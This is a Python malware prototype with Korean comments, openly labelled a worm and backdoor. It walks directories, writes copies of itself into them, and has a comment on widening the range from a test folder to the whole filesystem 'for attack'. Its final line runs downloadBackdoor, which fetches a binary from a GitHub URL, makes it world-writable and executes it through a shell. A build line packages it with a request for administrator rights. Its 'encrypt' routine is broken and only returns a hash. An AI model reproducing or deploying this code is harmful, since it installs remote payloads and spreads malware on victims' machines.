# pyinstaller -w --uac-admin test.py

import os, random, base64, struct, stat
from Crypto.Cipher import AES
from pathlib import Path
import hashlib 
import urllib.request
import subprocess as sp

PATH = []
copy_count = 0
BS = AES.block_size

def dir_listing():
    global PATH   
    testing_path = Path(os.getcwd()) # 1 level 상위 폴더에만 

    while(1):
        NOW_path = os.getcwd()
        if NOW_path == str(testing_path.parent.parent): # for testing # 조건 조작에 의해 공격 범위 설정 가능.
        # if NOW_path == '/': # for attack
            PATH = list(set(PATH))
            return PATH
        
        else:
            for (root, dir, files) in os.walk(NOW_path): # 현재 폴더 기준으로 하위의 directory 를 listing 해줌 최하위 directory 부터
                if os.path.isdir(root):
                    PATH.append(root)
        os.chdir('..')

class WORM:
    try: 
        os.mkdir('temp')
        os.chdir('temp')

    except FileExistsError:
        os.chdir('temp')
    
    def __init__(self):
        global PATH
        self.NOW_PATH = os.getcwd()
        self.max = 5
        self.victim_dir = []
            
    def copy(self): # worm 복제
        global copy_count
        f = open(__file__)     
        script = f.read()
        for i in range(0,self.max):
            FileName = "copy"+str(i)
            victim = open(FileName, 'w')
            victim.write(str(encrypt(script)))
            src=os.path.abspath(FileName)
            copy_count += 1
        f.close()
    
    def propagation(self): # worm 전파 
        global PATH 
        dir_listing()
        self.NOW_PATH = os.getcwd()
        
        for path in PATH: # dir_listing 에서 추출한 directory
            if path not in self.victim_dir: # 완료한 폴더는 제외
                os.chdir(path)  
                self.victim_dir.append(self.NOW_PATH)
                self.copy()                            
        # run(__file__) # 자가복제

def encrypt(script):
    
        for i in range(16):
            key = chr(random.randint(0, 0xFF))
        for i in range(16):
            iv = chr(random.randint(0, 0xFF))
            
        encoded_key = struct.pack('16s', key.encode('utf-8'))
        encoded_iv = struct.pack('16s', iv.encode('utf-8'))
        encoded_input = struct.pack('16s', script.encode('utf-8'))
        
        cipher = AES.new(encoded_key, AES.MODE_CBC, encoded_iv)
        encrypted = cipher.encrypt(encoded_input)
        encoded_encrypted = base64.b64encode(encrypted)
        hashed_encoded_encrypted = hashlib.sha512(encoded_encrypted)
        # ciphertext, tag = cipher.encrypt(script.encode('ascii'))
        return hashed_encoded_encrypted.hexdigest()

def downloadBackdoor(url):
        filename = url.split('/')[-1].split('#')[0].split('?')[0] # url 에서 filename 추출
        abs_filename = os.path.join(os.getcwd(), filename)
        print(os.getcwd())
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req) as response:
            content = response.read()   
        
        outfile = open(abs_filename, "wb")
        os.chmod(abs_filename, 0o777)
        outfile.write(content)
        outfile.close()
        print(abs_filename)
        run(os.path.abspath(abs_filename))
        print("finish downloading")

def run(prog):
        process = sp.Popen(prog, shell = True)
        process.wait()

 
# victim = WORM()
# victim.propagation()
# print("[+] the tesitng directory is \n",PATH )

# print(copy_count)

downloadBackdoor('https://github.com/lmjxxx/test/raw/main/a.out')


